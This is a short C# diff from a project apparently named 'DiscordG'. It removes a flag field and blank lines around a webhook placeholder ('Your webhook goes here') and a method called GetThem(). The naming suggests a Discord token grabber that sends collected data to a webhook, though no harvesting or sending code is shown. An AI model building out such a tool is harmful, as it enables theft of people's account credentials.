@@ -14,9 +14,7 @@ namespace DiscordG
     class Program
     {
         public static string webhook = ConsoleApp1.Program.Webhook_link; // Your webhook goes here
-        public static bool foundSth = false;
 
-       
 
         public static List<string> GetThem()
         {
